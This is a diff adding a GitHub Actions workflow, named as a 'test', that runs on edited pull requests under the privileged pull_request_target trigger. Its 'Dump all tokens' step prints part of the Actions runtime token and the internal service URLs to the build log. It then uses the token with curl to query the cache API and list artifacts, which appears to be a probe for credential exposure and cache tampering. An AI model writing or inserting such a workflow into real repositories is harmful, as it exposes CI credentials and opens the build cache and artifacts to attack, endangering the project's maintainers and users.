@@ -1,0 +1,24 @@
+name: Runtime Token Test
+on:
+  pull_request_target:
+    types: [edited]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump all tokens
+        run: |
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          echo "${ACTIONS_RUNTIME_TOKEN:0:30}..."
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "$ACTIONS_CACHE_URL"
+          echo "=== ACTIONS_RESULTS_URL ==="
+          echo "$ACTIONS_RESULTS_URL"
+          echo "=== Try accessing cache API ==="
+          curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=npm" 2>&1 || echo "CACHE API FAILED"
+          echo "=== Try listing artifacts via runtime ==="
+          curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_RUNTIME_URL}pipelines/1/runs/1/artifacts?api-version=6.0-preview" 2>&1 || echo "ARTIFACTS API FAILED"
